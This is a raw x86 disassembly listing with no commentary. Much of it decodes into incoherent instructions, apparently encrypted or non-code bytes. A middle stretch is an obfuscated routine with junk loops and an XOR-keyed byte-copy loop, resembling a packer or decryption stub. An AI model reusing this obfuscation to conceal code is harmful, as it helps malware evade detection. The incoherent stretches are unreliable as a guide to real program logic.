  4039ea:	cli    
  4039eb:	std    
  4039ec:	popa   
  4039ed:	cli    
  4039ee:	data16 (bad) 
  4039f0:	std    
  4039f1:	cli    
  4039f2:	jl     0x403999
  4039f4:	jno    0x403a2b
  4039f6:	dec    ebp
  4039f7:	cmp    ch,BYTE PTR [edx]
  4039f9:	jns    0x403a52
  4039fb:	ins    BYTE PTR es:[edi],dx
  4039fc:	jbe    0x4039b5
  4039fe:	nop
  4039ff:	stos   BYTE PTR es:[edi],al
  403a00:	leave  
  403a01:	fbstp  TBYTE PTR [eax+eiz*2]
  403a04:	fimul  WORD PTR [ecx]
  403a06:	stc    
  403a07:	scas   al,BYTE PTR es:[edi]
  403a08:	(bad)  
  403a09:	repz dec ecx
  403a0b:	push   ebp
  403a0c:	push   es
  403a0d:	outs   dx,BYTE PTR ds:[esi]
  403a0e:	ffree  st(1)
  403a10:	sbb    BYTE PTR [ebx+0x4a5a2470],dh
  403a16:	cdq    
  403a17:	push   eax
  403a18:	cmp    eax,0x4a9767f0
  403a1d:	popa   
  403a1e:	xor    BYTE PTR [eax+eiz*8-0x5c624835],bl
  403a25:	mov    dh,0x35
  403a27:	dec    ecx
  403a28:	cmp    cl,bl
  403a2a:	or     DWORD PTR [esi+0x7a],edx
  403a2d:	les    ebx,FWORD PTR [ebx]
  403a2f:	push   es
  403a30:	push   0x33
  403a32:	dec    ebp
  403a33:	fbstp  TBYTE PTR [edx+0x7df8ef1c]
  403a39:	int    0xfb
  403a3b:	mov    ds,WORD PTR [ebx+0x29]
  403a3e:	push   ebp
  403a3f:	jno    0x403a1f
  403a41:	sub    ch,BYTE PTR [ebx]
  403a43:	mov    eax,0xd50a1fe3
  403a48:	jp     0x403a1d
  403a4a:	fincstp 
  403a4c:	mov    ds:0xc0463a04,al
  403a51:	loop   0x403abf
  403a53:	mov    bl,0xd6
  403a55:	pop    eax
  403a56:	dec    ecx
  403a57:	cdq    
  403a58:	mov    ch,0x6
  403a5a:	and    ecx,DWORD PTR [ebp-0x4d3f2a07]
  403a60:	sar    DWORD PTR [ecx],0xad
  403a63:	jns    0x403a77
  403a65:	(bad)  
  403a66:	retf   
  403a67:	sbb    DWORD PTR [edi+0x5064070a],ebx
  403a6d:	loop   0x403aca
  403a6f:	jo     0x403ac5
  403a71:	inc    esi
  403a72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a73:	mov    dl,0x6
  403a75:	iret   
  403a76:	mov    ds:0x771bb9ab,al
  403a7b:	shl    esi,0x1a
  403a7e:	and    bl,0x34
  403a81:	cwde   
  403a82:	cdq    
  403a83:	mov    eax,ds:0x543a022c
  403a88:	ror    dh,cl
  403a8a:	popa   
  403a8b:	add    BYTE PTR [esi+0x5],ah
  403a8e:	dec    ebp
  403a8f:	mov    bh,0xd
  403a91:	xor    al,0xaf
  403a93:	mov    DWORD PTR [edi],ebx
  403a95:	rol    edx,1
  403a97:	imul   esp,DWORD PTR [edx+0x2],0xf06cb8fa
  403a9e:	pop    ebx
  403a9f:	xchg   BYTE PTR [edi+0x1f7d9cdd],ch
  403aa5:	outs   dx,DWORD PTR ds:[esi]
  403aa6:	(bad)
  403aaa:	pop    ds
  403aab:	pop    es
  403aac:	mov    WORD PTR [edi],fs
  403aae:	mov    esi,0x3521810a
  403ab3:	js     0x403b11
  403ab5:	mov    DWORD PTR [esi+eax*1-0x1b],eax
  403ab9:	(bad)
  403abc:	and    eax,ebp
  403abe:	shl    BYTE PTR ds:0x499c1d6c,cl
  403ac4:	lds    edx,FWORD PTR [ebx+0x11]
  403ac7:	lahf   
  403ac8:	adc    eax,0x635733d8
  403acd:	outs   dx,DWORD PTR ds:[esi]
  403ace:	sar    DWORD PTR ds:0x1351926b,cl
  403ad4:	imul   edi,edx,0xffffffdf
  403ad7:	add    DWORD PTR [edx],ebp
  403ad9:	mov    dl,0xf
  403adb:	fsub   DWORD PTR [eax]
  403add:	and    al,0x56
  403adf:	int3   
  403ae0:	scas   al,BYTE PTR es:[edi]
  403ae1:	shr    BYTE PTR [esi-0x4cebe129],cl
  403ae7:	inc    BYTE PTR [ebp-0x35]
  403aea:	inc    esi
  403aeb:	mov    dl,0x46
  403aed:	aas    
  403aee:	adc    DWORD PTR [eax-0x60],esi
  403af1:	adc    BYTE PTR [edi-0x7f],al
  403af4:	je     0x403b04
  403af6:	call   0xd98b:0x1742b3cc
  403afd:	int3   
  403afe:	mov    edi,0xc675400f
  403b03:	in     eax,dx
  403b04:	in     eax,0x76
  403b06:	iret   
  403b07:	push   edx
  403b08:	mov    ecx,DWORD PTR [ecx+0x70165744]
  403b0e:	dec    eax
  403b0f:	mov    dh,0x43
  403b11:	inc    edi
  403b12:	xchg   ebp,eax
  403b13:	add    dh,BYTE PTR [edx]
  403b15:	sti    
  403b16:	test   bl,bh
  403b18:	mov    ah,0xa
  403b1a:	ja     0x403b19
  403b1c:	jae    0x403ad6
  403b1e:	mov    dh,0xb4
  403b20:	jmp    0xf58bd31d
  403b25:	int    0x46
  403b27:	rcl    BYTE PTR [ecx],cl
  403b29:	in     al,0xed
  403b2b:	adc    BYTE PTR [ebx-0x35],cl
  403b2e:	push   ds
  403b2f:	push   esp
  403b30:	ds push edi
  403b32:	mov    dl,0x33
  403b34:	xchg   ebx,eax
  403b35:	pop    DWORD PTR [edx-0x66]
  403b38:	mov    eax,ds:0x8e628103
  403b3d:	xchg   edi,eax
  403b3e:	pop    es
  403b3f:	add    DWORD PTR [ecx-0x1a],ebp
  403b42:	mov    eax,ds:0xf3411f2b
  403b47:	dec    esi
  403b48:	icebp  
  403b49:	mov    ebp,0x52714149
  403b4e:	push   cs
  403b4f:	xor    ecx,DWORD PTR [ebp-0x7eea6046]
  403b55:	mov    BYTE PTR [edi+0x1d9c59eb],ch
  403b5b:	bnd jb 0x403b9c
  403b5e:	pop    esp
  403b5f:	sar    esi,0x6a
  403b62:	pop    es
  403b63:	call   0x6466:0xdf2efa
  403b6a:	inc    esp
  403b6b:	outs   dx,BYTE PTR ds:[esi]
  403b6c:	xchg   esp,eax
  403b6d:	push   ebx
  403b6e:	or     eax,0xdeeb35d4
  403b73:	adc    BYTE PTR es:[edi],dl
  403b76:	stc    
  403b77:	adc    eax,0x417f69fb
  403b7c:	loop   0x403b9f
  403b7e:	push   edx
  403b7f:	jge    0x403b74
  403b81:	sbb    eax,0x1659d44b
  403b86:	add    BYTE PTR [edi-0x14],ah
  403b89:	test   BYTE PTR [esi],0x1
  403b8c:	bound  ebx,QWORD PTR [ecx+0x4859ac27]
  403b92:	mov    dl,0x40
  403b94:	arpl   WORD PTR [esi],si
  403b96:	in     eax,dx
  403b97:	mov    ds:0x104525d5,eax
  403b9c:	inc    ecx
  403b9d:	push   edx
  403b9e:	and    dh,ah
  403ba0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ba1:	cdq    
  403ba2:	xor    esi,DWORD PTR [esi]
  403ba4:	pusha  
  403ba5:	clc    
  403ba6:	inc    esp
  403ba7:	aas    
  403ba8:	das    
  403ba9:	scas   eax,DWORD PTR es:[edi]
  403baa:	inc    esp
  403bab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403bac:	sti    
  403bad:	shl    DWORD PTR [ebx+0x4c08c3bd],cl
  403bb3:	sbb    ah,bl
  403bb5:	push   ecx
  403bb6:	xor    eax,0x24589e6d
  403bbb:	repnz xlat BYTE PTR ds:[ebx]
  403bbd:	lds    ebx,FWORD PTR [ebx+esi*8+0x628f3165]
  403bc4:	jns    0x403bb2
  403bc6:	in     al,0xc7
  403bc8:	dec    edi
  403bc9:	sbb    al,0x4f
  403bcb:	lahf   
  403bcc:	mov    DWORD PTR [edi-0x3e05bbf9],0x5b4fe33b
  403bd6:	in     eax,dx
  403bd7:	mov    esi,0x58bb1c8d
  403bdc:	ret    0x2983
  403bdf:	pop    es
  403be0:	clts   
  403be2:	mov    ecx,0x9b4c9d79
  403be7:	in     al,dx
  403be8:	daa    
  403be9:	(bad)  
  403bea:	mov    edx,0x33467d82
  403bef:	sbb    dh,ch
  403bf1:	dec    eax
  403bf2:	and    eax,eax
  403bf4:	mov    ds:0x459f982d,al
  403bf9:	aam    0x25
  403bfb:	xchg   edi,eax
  403bfc:	sbb    ebx,DWORD PTR ds:0xa640a8c6
  403c02:	rcr    BYTE PTR [ecx+edi*1],0x87
  403c06:	push   ebx
  403c07:	(bad)  
  403c08:	test   eax,0xf11022c1
  403c0d:	stos   BYTE PTR es:[edi],al
  403c0e:	fmul   QWORD PTR [ecx+0x4959e177]
  403c14:	mov    dh,0xc3
  403c16:	and    eax,0xf2636403
  403c1b:	mov    ds:0x6f419ce,al
  403c20:	and    BYTE PTR [ebx+ebp*8+0x10d576e6],0xba
  403c28:	imul   esi,DWORD PTR [edi+edx*1-0x127693eb],0x763e9a41
  403c33:	rol    DWORD PTR [ebp-0x6e3474ea],cl
  403c39:	xchg   eax,edi
  403c3b:	retf   0xcfa5
  403c3e:	popf   
  403c3f:	int3   
  403c40:	sti    
  403c41:	mov    al,0xa1
  403c43:	outs   dx,BYTE PTR ds:[esi]
  403c44:	je     0x403cad
  403c46:	jg     0x403bee
  403c48:	js     0x403bcb
  403c4a:	pop    edi
  403c4b:	jmp    0x403caf
  403c4d:	adc    BYTE PTR [eax],al
  403c4f:	(bad)  
  403c50:	lahf   
  403c51:	cmp    eax,0x7ac9c509
  403c56:	pop    edx
  403c57:	cs xor al,0xfa
  403c5a:	and    eax,0x2b274c84
  403c5f:	nop
  403c60:	ret    0xf182
  403c63:	fcmove st,st(2)
  403c65:	sbb    esi,DWORD PTR [ecx+0x27]
  403c68:	mov    dl,BYTE PTR [ebx-0x3918d0ab]
  403c6e:	nop
  403c6f:	pop    ecx
  403c70:	inc    esp
  403c71:	cs push esp
  403c73:	or     DWORD PTR [eax-0x35ce7044],0x4963d11c
  403c7d:	jnp    0x403c1a
  403c7f:	push   ebx
  403c80:	xor    ecx,eax
  403c82:	mov    DWORD PTR [ebp+0x8],ecx
  403c85:	mov    ecx,DWORD PTR [ebp+0x8]
  403c88:	mov    edx,DWORD PTR [ebp+0x8]
  403c8b:	xor    ecx,eax
  403c8d:	imul   edx,edx,0x5708f5
  403c93:	add    ecx,esi
  403c95:	lea    ecx,[ebp+ecx*4-0x64]
  403c99:	mov    edi,DWORD PTR [ecx]
  403c9b:	add    edx,edi
  403c9d:	mov    DWORD PTR [ecx],edx
  403c9f:	mov    ecx,DWORD PTR [ebp+0x8]
  403ca2:	xor    ecx,eax
  403ca4:	add    ecx,esi
  403ca6:	jne    0x4018ed
  403cac:	mov    ecx,DWORD PTR [ebp-0x8]
  403caf:	xor    ecx,eax
  403cb1:	mov    eax,DWORD PTR [ebp+0x10]
  403cb4:	add    ecx,esi
  403cb6:	mov    DWORD PTR [eax],ecx
  403cb8:	pop    edi
  403cb9:	pop    esi
  403cba:	pop    ebx
  403cbb:	leave  
  403cbc:	ret    0xc
  403cbf:	push   ebp
  403cc0:	mov    ebp,esp
  403cc2:	mov    DWORD PTR ds:0x41d4ec,0xf89c85b5
  403ccc:	pop    ebp
  403ccd:	mov    DWORD PTR ds:0x429000,0x2616
  403cd7:	jmp    0x41046f
  403cdc:	sbb    DWORD PTR ds:0x427018,edx
  403ce2:	mov    eax,0x80670b3f
  403ce7:	ret    
  403ce8:	push   ebp
  403ce9:	mov    ebp,esp
  403ceb:	sub    esp,0x10
  403cee:	mov    eax,0xf89c85b6
  403cf3:	mov    DWORD PTR ds:0x425004,0x1b
  403cfd:	cmp    DWORD PTR ds:0x425004,0x0
  403d04:	je     0x403d42
  403d0a:	cmp    DWORD PTR ds:0x425004,0x29
  403d11:	jne    0x403d26
  403d17:	push   DWORD PTR [ebp-0xc]
  403d1a:	push   DWORD PTR [ebp-0x1c]
  403d1d:	push   DWORD PTR [ebp-0x18]
  403d20:	call   DWORD PTR ds:0x421020
  403d26:	mov    edx,DWORD PTR ds:0x425004
  403d2c:	dec    edx
  403d2d:	mov    DWORD PTR ds:0x425004,edx
  403d33:	jmp    0x403cfd
  403d38:	xor    DWORD PTR ds:0x426018,0x7d7c
  403d42:	mov    DWORD PTR [ebp-0x4],eax
  403d45:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  403d4c:	and    DWORD PTR ds:0x428014,0x0
  403d56:	jmp    0x403d68
  403d5b:	mov    ecx,DWORD PTR ds:0x428014
  403d61:	inc    ecx
  403d62:	mov    DWORD PTR ds:0x428014,ecx
  403d68:	cmp    DWORD PTR ds:0x428014,0x1f
  403d6f:	jae    0x403db8
  403d75:	cmp    DWORD PTR ds:0x428014,0x4
  403d7c:	jne    0x403d93
  403d82:	push   DWORD PTR [ebp-0x18]
  403d85:	push   0x8961
  403d8a:	push   DWORD PTR [ebp-0x14]
  403d8d:	call   DWORD PTR ds:0x421028
  403d93:	cmp    DWORD PTR ds:0x428014,0x3
  403d9a:	jne    0x403dad
  403da0:	mov    ecx,DWORD PTR ds:0x428014
  403da6:	inc    ecx
  403da7:	mov    DWORD PTR ds:0x428014,ecx
  403dad:	jmp    0x403d5b
  403db2:	add    ecx,DWORD PTR ds:0x425000
  403db8:	mov    ecx,DWORD PTR [ebp-0x4]
  403dbb:	adc    DWORD PTR ds:0x426000,edi
  403dc1:	push   esi
  403dc2:	or     edx,esi
  403dc4:	mov    edx,0x7510893
  403dc9:	and    DWORD PTR ds:0x429014,0x0
  403dd3:	mov    esi,DWORD PTR ds:0x429014
  403dd9:	inc    esi
  403dda:	mov    DWORD PTR ds:0x429014,esi
  403de0:	cmp    DWORD PTR ds:0x429014,0x5
  403de7:	jne    0x403df8
  403ded:	push   0x41ff1f
  403df2:	call   DWORD PTR ds:0x42102c
  403df8:	cmp    DWORD PTR ds:0x429014,0x4
  403dff:	jne    0x403e12
  403e05:	mov    esi,DWORD PTR ds:0x429014
  403e0b:	inc    esi
  403e0c:	mov    DWORD PTR ds:0x429014,esi
  403e12:	cmp    DWORD PTR ds:0x429014,0x15
  403e19:	jb     0x403dd3
  403e1f:	movzx  esi,BYTE PTR ds:0x429008
  403e26:	sub    DWORD PTR ds:0x42900c,esi
  403e2c:	xor    ecx,edx
  403e2e:	mov    esi,0x3272db
  403e33:	push   edi
  403e34:	sbb    edi,DWORD PTR ds:0x42601c
  403e3a:	mov    edi,DWORD PTR [ebp+0x10]
  403e3d:	add    ecx,esi
  403e3f:	mov    DWORD PTR ds:0x42700c,0x23cb
  403e49:	cmp    ecx,edi
  403e4b:	mov    DWORD PTR ds:0x425000,0x3f40
  403e55:	je     0x403f20
  403e5b:	mov    ecx,DWORD PTR [ebp-0x4]
  403e5e:	sub    edi,0x7e0f
  403e64:	mov    edi,DWORD PTR [ebp+0x10]
  403e67:	xor    eax,eax
  403e69:	xor    ecx,edx
  403e6b:	add    ecx,esi
  403e6d:	add    edi,0xfabdbef1
  403e73:	adc    eax,0xffffffff
  403e76:	xor    eax,0x0
  403e79:	mov    DWORD PTR [ebp-0xc],eax
  403e7c:	push   ebx
  403e7d:	xor    ebx,ebx
  403e7f:	xor    edi,0x8a29a123
  403e85:	mov    eax,ecx
  403e87:	add    eax,0xfabdbef1
  403e8c:	adc    ebx,0xffffffff
  403e8f:	xor    eax,0x8a29a123
  403e94:	xor    ebx,0x0
  403e97:	cmp    eax,edi
  403e99:	jne    0x403eb2
  403e9f:	cmp    ebx,DWORD PTR [ebp-0xc]
  403ea2:	je     0x403f1a
  403ea8:	jmp    0x403eb2
  403ead:	mov    esi,0x3272db
  403eb2:	mov    eax,DWORD PTR [ebp-0x4]
  403eb5:	mov    edi,DWORD PTR [ebp-0x8]
  403eb8:	xor    edi,edx
  403eba:	add    edi,esi
  403ebc:	mov    esi,DWORD PTR [ebp+0x8]
  403ebf:	imul   edi,ecx
  403ec2:	mov    ebx,DWORD PTR [ebp+0xc]
  403ec5:	xor    eax,edx
  403ec7:	add    eax,ecx
  403ec9:	mov    al,BYTE PTR [ebx+eax*1+0x3272db]
  403ed0:	mov    BYTE PTR [edi+esi*1],al
  403ed3:	mov    eax,DWORD PTR [ebp-0x8]
  403ed6:	mov    esi,DWORD PTR [ebp+0x10]
  403ed9:	xor    eax,edx
  403edb:	xor    ebx,ebx
  403edd:	add    esi,0xfabdbef1
  403ee3:	adc    ebx,0xffffffff
  403ee6:	lea    ecx,[ecx+eax*1+0x3272db]
  403eed:	xor    edi,edi
  403eef:	xor    esi,0x8a29a123
  403ef5:	xor    ebx,0x0
  403ef8:	mov    eax,ecx
  403efa:	add    eax,0xfabdbef1
  403eff:	adc    edi,0xffffffff
  403f02:	xor    eax,0x8a29a123
  403f07:	xor    edi,0x0
  403f0a:	cmp    eax,esi
  403f0c:	jne    0x403ead
  403f12:	cmp    edi,ebx
  403f14:	jne    0x403ead
  403f1a:	mov    eax,0xf89c85b5
  403f1f:	pop    ebx
  403f20:	pop    edi
  403f21:	pop    esi
  403f22:	leave  
  403f23:	ret    0xc
  403f26:	push   ebp
  403f27:	mov    ebp,esp
  403f29:	sub    esp,0x78
  403f2c:	adc    DWORD PTR ds:0x42601c,0x7e2b
  403f36:	push   ebx
  403f37:	push   esi
  403f38:	push   edi
  403f39:	push   0x1f
  403f3b:	sub    DWORD PTR ds:0x42601c,0x56d8
  403f45:	lea    eax,[ebp-0x78]
  403f48:	sbb    DWORD PTR ds:0x42801c,0x71f8
  403f52:	push   eax
  403f53:	add    DWORD PTR ds:0x429018,0x427000
  403f5d:	push   0x0
  403f5f:	sub    DWORD PTR ds:0x42501c,0x427004
  403f69:	call   DWORD PTR ds:0x421044
  403f6f:	push   0x97898797
  403f74:	and    DWORD PTR ds:0x426000,0x1a8d
  403f7e:	call   DWORD PTR ds:0x421010
  403f84:	and    DWORD PTR ds:0x42600c,0x0
  403f8e:	mov    ecx,DWORD PTR ds:0x42600c
  403f94:	inc    ecx
  403f95:	mov    DWORD PTR ds:0x42600c,ecx
  403f9b:	cmp    DWORD PTR ds:0x42600c,0x21
  403fa2:	jne    0x403fda
  403fa8:	push   0x67f5
  403fad:	push   0x706e
  403fb2:	push   DWORD PTR [ebp-0x1c]
  403fb5:	push   0x21f9
  403fba:	push   DWORD PTR [ebp-0x24]
  403fbd:	push   0x372d
  403fc2:	push   DWORD PTR [ebp-0x1c]
  403fc5:	push   0x6932
  403fca:	push   0x2439
  403fcf:	push   0x1248
  403fd4:	call   DWORD PTR ds:0x421030
  403fda:	cmp    DWORD PTR ds:0x42600c,0x1d
  403fe1:	jb     0x403f8e
  403fe7:	add    DWORD PTR ds:0x428010,ebx
  403fed:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  403ff4:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  403ffb:	or     DWORD PTR ds:0x42701c,0x426014
  404005:	mov    ecx,DWORD PTR [ebp-0x4]
  404008:	adc    eax,0xdaa
  40400d:	mov    ebx,0x7510893
  404012:	xor    DWORD PTR ds:0x427004,ebx
  404018:	xor    ecx,ebx
  40401a:	mov    eax,0x3272db
  40401f:	add    ecx,eax
  404021:	mov    DWORD PTR [ebp-0x1c],ecx
  404024:	and    DWORD PTR ds:0x428010,0x0
  40402e:	jmp    0x404040
  404033:	mov    ecx,DWORD PTR ds:0x428010
  404039:	inc    ecx
  40403a:	mov    DWORD PTR ds:0x428010,ecx
  404040:	cmp    DWORD PTR ds:0x428010,0x18
  404047:	jae    0x40406f
  40404d:	cmp    DWORD PTR ds:0x428010,0x20
  404054:	jne    0x40406a
  40405a:	push   0x42801c
  40405f:	push   0x7111
  404064:	call   DWORD PTR ds:0x421058
  40406a:	jmp    0x404033
  40406f:	mov    ecx,DWORD PTR [ebp+0x14]
  404072:	adc    DWORD PTR ds:0x426004,0x3b44
  40407c:	test   ecx,ecx
  40407e:	mov    DWORD PTR ds:0x425024,0xafb
  404088:	je     0x404096
  40408e:	mov    ecx,DWORD PTR [ebp+0x14]
  404091:	mov    ecx,DWORD PTR [ecx]
  404093:	mov    DWORD PTR [ebp-0x1c],ecx
  404096:	mov    ecx,0x7665
  40409b:	imul   edx,eax
  40409e:	or     DWORD PTR ds:0x429000,0x5016
  4040a8:	mov    esi,0x76532
  4040ad:	sbb    DWORD PTR ds:0x429008,0x6d64
  4040b7:	add    edx,ecx
  4040b9:	xchg   esi,ecx
  4040bb:	or     esi,DWORD PTR ds:0x427010
  4040c1:	mov    edi,0x54354
  4040c6:	sub    edx,edi
  4040c8:	xor    DWORD PTR ds:0x42600c,edi
  4040ce:	mov    ecx,DWORD PTR [ebp-0x4]
  4040d1:	xor    DWORD PTR ds:0x425008,0x2961
  4040db:	xor    ecx,ebx
  4040dd:	mov    DWORD PTR ds:0x42601c,0x16
  4040e7:	cmp    DWORD PTR ds:0x42601c,0x0
  4040ee:	je     0x404130
  4040f4:	cmp    DWORD PTR ds:0x42601c,0x1d
  4040fb:	jne    0x404114
  404101:	push   0x425014
  404106:	push   0x426014
  40410b:	push   DWORD PTR [ebp-0x28]
  40410e:	call   DWORD PTR ds:0x42105c
  404114:	mov    esi,DWORD PTR ds:0x42601c
  40411a:	dec    esi
  40411b:	mov    DWORD PTR ds:0x42601c,esi
  404121:	jmp    0x4040e7
  404126:	sbb    DWORD PTR ds:0x425014,0x65a5
  404130:	add    ecx,eax
  404132:	mov    esi,DWORD PTR ds:0x425008
  404138:	sbb    DWORD PTR ds:0x426008,esi
  40413e:	mov    DWORD PTR [ebp-0x8],ecx
  404141:	sub    DWORD PTR ds:0x428010,edx
  404147:	mov    ecx,DWORD PTR [ebp-0x14]
  40414a:	mov    DWORD PTR ds:0x428008,0x2441
  404154:	xor    ecx,ebx
  404156:	add    ecx,eax
  404158:	mov    DWORD PTR [ebp-0x24],ecx
  40415b:	mov    ecx,DWORD PTR ds:0x42801c
  404161:	sbb    DWORD PTR ds:0x429004,ecx
  404167:	mov    ecx,DWORD PTR [ebp-0x4]
  40416a:	xor    ecx,ebx
  40416c:	mov    DWORD PTR ds:0x426000,0x1b
  404176:	cmp    DWORD PTR ds:0x426000,0x0
  40417d:	je     0x4041b9
  404183:	cmp    DWORD PTR ds:0x426000,0x22
  40418a:	jne    0x4041a3
  404190:	push   0x561f
  404195:	push   0x425014
  40419a:	push   DWORD PTR [ebp-0xc]
  40419d:	call   DWORD PTR ds:0x421034
  4041a3:	xor    esi,esi
  4041a5:	add    esi,DWORD PTR ds:0x426000
  4041ab:	dec    esi
  4041ac:	mov    DWORD PTR ds:0x426000,esi
  4041b2:	jmp    0x404176
  4041b7:	neg    esi
  4041b9:	add    ecx,eax
  4041bb:	adc    DWORD PTR ds:0x425014,edi
  4041c1:	mov    DWORD PTR [ebp-0x30],ecx
  4041c4:	or     DWORD PTR ds:0x426000,0x760b
  4041ce:	mov    esi,DWORD PTR [ebp-0x4]
  4041d1:	and    DWORD PTR ds:0x42700c,0x0
  4041db:	mov    ecx,DWORD PTR ds:0x42700c
  4041e1:	inc    ecx
  4041e2:	mov    DWORD PTR ds:0x42700c,ecx
  4041e8:	cmp    DWORD PTR ds:0x42700c,0x1f
  4041ef:	jne    0x404203
  4041f5:	push   DWORD PTR [ebp-0xc]
  4041f8:	push   0x7ec8
  4041fd:	call   DWORD PTR ds:0x421038
  404203:	cmp    DWORD PTR ds:0x42700c,0x13
  40420a:	jb     0x4041db
  404210:	xor    esi,ebx
  404212:	mov    DWORD PTR ds:0x426018,0x19
  40421c:	cmp    DWORD PTR ds:0x426018,0x0
  404223:	je     0x40427d
  404229:	cmp    DWORD PTR ds:0x426018,0xc
  404230:	jne    0x404251
  404236:	push   DWORD PTR [ebp-0x24]
  404239:	push   0x1686
  40423e:	push   0x428008
  404243:	push   DWORD PTR [ebp-0x28]
  404246:	push   0x2eb1
  40424b:	call   DWORD PTR ds:0x421000
  404251:	cmp    DWORD PTR ds:0x426018,0xd
  404258:	jne    0x40426b
  40425e:	mov    ecx,DWORD PTR ds:0x426018
  404264:	dec    ecx
  404265:	mov    DWORD PTR ds:0x426018,ecx
  40426b:	mov    ecx,DWORD PTR ds:0x426018
  404271:	dec    ecx
  404272:	mov    DWORD PTR ds:0x426018,ecx
  404278:	jmp    0x40421c
  40427d:	add    esi,eax
  40427f:	sub    DWORD PTR ds:0x428008,edx
  404285:	mov    ecx,DWORD PTR [ebp-0x24]
  404288:	or     DWORD PTR ds:0x429008,0x427008
  404292:	sub    ecx,eax
  404294:	jmp    0x4065e9
  404299:	div    ecx
  40429b:	and    DWORD PTR [edi+eax*1+0x64],edx
  40429f:	xchg   ebx,eax
  4042a0:	lods   eax,DWORD PTR ds:[esi]
  4042a1:	mov    edx,0x189c947b
  4042a6:	pop    edi
  4042a7:	add    esp,ebx
  4042a9:	sbb    bl,BYTE PTR [edi+0x62]
  4042ac:	bound  ebp,QWORD PTR [edx]
  4042ae:	pop    edi
  4042af:	bound  esp,QWORD PTR [edx+0x35]
  4042b2:	ja     0x40431b
  4042b4:	ins    DWORD PTR es:[edi],dx
  4042b5:	fdivr  DWORD PTR [edx+0xf]
  4042b8:	pop    edx
  4042b9:	jge    0x4042d2
  4042bb:	cmp    cl,BYTE PTR [edi+0x19]
  4042be:	xor    eax,0x51babc6c
  4042c3:	test   BYTE PTR [esi+0x693d430d],ah
  4042c9:	pop    ss
  4042ca:	aad    0x9f
  4042cc:	int    0xd7
  4042ce:	enter  0xe0c1,0xad
  4042d2:	jp     0x40426f
  4042d4:	jno    0x40427d
  4042d6:	adc    BYTE PTR [eax+0x3cb28e],al
  4042dc:	jg     0x4042a6
  4042de:	sbb    eax,0x1d1a1243
  4042e3:	call   0x958f:0x485fa6f8
  4042ea:	outs   dx,DWORD PTR ds:[esi]
  4042eb:	lds    ebp,FWORD PTR [edx+ecx*1]
  4042ee:	ror    DWORD PTR [ecx-0x3f8f10be],cl
  4042f4:	mov    ?,WORD PTR [ebp-0x67419f1c]
  4042fa:	ja     0x40435a
  4042fc:	int3   
  4042fd:	sub    BYTE PTR [eax-0x34],ch
  404300:	fs jno 0x404352
  404303:	xor    bl,BYTE PTR [esi+edi*2-0x5d]
  404307:	bound  ebp,QWORD PTR [edi-0x39]
  40430a:	cdq    
  40430b:	mov    ax,0xe30c
  40430f:	test   al,0x6f
  404311:	(bad)  [edx+ebx*1]
  404314:	mov    cl,0xa9
  404316:	jecxz  0x40432d
  404318:	pop    ecx
  40431a:	jae    0x40433a
  40431c:	test   al,0x1
  40431e:	xor    ah,bh
  404320:	xor    dh,BYTE PTR [esi+0x49127da5]
  404326:	dec    esp
  404327:	(bad)  
  404328:	outs   dx,BYTE PTR ds:[esi]
  404329:	xchg   esi,eax
  40432a:	jp     0x4042ac
  40432c:	hlt    
  40432d:	sub    DWORD PTR [edx],edi
  40432f:	pop    edi
  404330:	lock int3 
  404332:	cld    
  404333:	jbe    0x4043ab
  404335:	fldenv [eax]
  404337:	cli    
  404338:	popf   
  404339:	std    
  40433a:	repnz rcl ch,cl
  40433d:	jne    0x40439c
  40433f:	pop    ss
  404340:	add    al,0x8f
  404342:	add    eax,0x690ebb98
  404347:	mov    ecx,0xa97c2510
  40434c:	(bad)  [ebx]
  40434e:	inc    eax
  40434f:	aas    
  404350:	sub    eax,0xd24775f3
  404355:	loopne 0x404387
  404357:	xchg   esp,eax
  404358:	lock repnz ss ss sub al,0xef
  40435e:	jmp    0x404328
  404360:	push   edi
  404361:	daa    
  404362:	jl     0x40437d
  404364:	cmp    al,BYTE PTR [ebx-0x31]
  404367:	xchg   edi,eax
  404368:	scas   eax,DWORD PTR es:[edi]
  404369:	adc    BYTE PTR ds:0x78ef632f,al
  40436f:	retf   
  404370:	sti    
  404371:	sbb    esp,DWORD PTR [edi+0x7e]
  404374:	int3   
  404375:	test   eax,0x71891c9c
  40437a:	in     eax,dx
  40437b:	xor    cl,BYTE PTR [ebp+0x4b69746d]
  404381:	test   DWORD PTR [ecx-0xd],edx
  404384:	aas    
  404385:	or     DWORD PTR [ebx],ebx
  404387:	or     ebp,DWORD PTR [eax-0x6b]
  40438a:	test   dh,cl
  40438c:	popa   
  40438d:	outs   dx,DWORD PTR ds:[esi]
  40438e:	fcmovnbe st,st(5)
  404390:	lods   al,BYTE PTR ds:[esi]
  404391:	repnz sub al,BYTE PTR [ebp-0x260da61]
  404398:	(bad)  [ebx+0x5f96f208]
  40439e:	cmp    ecx,ebp
  4043a0:	lods   al,BYTE PTR ds:[esi]
  4043a1:	aas    
  4043a2:	loopne 0x4043b5
  4043a4:	push   esp
  4043a5:	adc    eax,0x66a581f5
  4043aa:	out    0x49,eax
  4043ac:	sar    DWORD PTR [eax-0x67],0xd5
  4043b0:	sub    al,0xba
  4043b2:	mov    bl,0xce
  4043b4:	and    al,0x8f
  4043b6:	xchg   ebp,eax
  4043b7:	pushf  
  4043b8:	and    eax,0x4c514060
  4043bd:	ss sub al,0x14
  4043c0:	out    dx,eax
  4043c1:	mov    ebx,0xcd62b71a
  4043c6:	in     al,0x3
  4043c8:	and    al,0x54
  4043ca:	(bad)  
  4043cb:	dec    esi
  4043cc:	push   edx
  4043cd:	fwait
  4043ce:	sub    cl,cl
  4043d0:	inc    ebx
  4043d1:	xor    BYTE PTR [ecx-0x4e],dl
  4043d4:	or     DWORD PTR ds:0x2173f93,esp
  4043da:	inc    edx
  4043db:	xchg   esi,eax
  4043dc:	jmp    0x40440f
  4043de:	hlt    
  4043df:	gs call 0x35bafdcb
  4043e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4043e6:	jmp    0x8776:0x3decca6e
  4043ed:	shl    BYTE PTR [esi],cl
  4043ef:	mov    ch,0x8c
  4043f1:	in     eax,0x44
  4043f3:	int3   
  4043f4:	or     al,0x29
  4043f6:	into   
  4043f7:	pop    ss
  4043f8:	xor    al,0xe0
  4043fa:	inc    ecx
  4043fb:	aad    0x83
